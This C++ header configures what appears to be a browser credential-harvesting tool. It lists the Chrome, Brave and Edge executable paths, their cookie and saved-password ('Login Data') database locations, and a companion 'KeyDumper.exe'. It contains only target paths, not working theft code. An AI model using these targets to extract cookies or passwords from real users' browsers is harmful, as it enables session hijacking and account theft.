#pragma once
#include<string>
#include "../utils/utils.h"

enum BrowserType {
	Chrome,
	Brave,
	Edge
};

struct BrowserPathConfig {
	BrowserType type;
	std::wstring exePath;

	std::string cookiesPath;
	std::string passwordsPath;
};


namespace config {
	
	static std::string localAppData = utils::getEnvVar("LOCALAPPDATA");

	static std::wstring keyDumperPath = L"./KeyDumper.exe";

	static BrowserPathConfig chrome = BrowserPathConfig{
		BrowserType::Chrome,
		L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
		localAppData + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
		localAppData + "\\Google\\Chrome\\User Data\\Default\\Login Data"
	};

	static BrowserPathConfig brave = BrowserPathConfig{
		BrowserType::Brave,
		L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
		localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies",
		localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"
	};

	static BrowserPathConfig edge = BrowserPathConfig{
		BrowserType::Edge,
		L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
		localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies",
		localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Login Data"
	};
}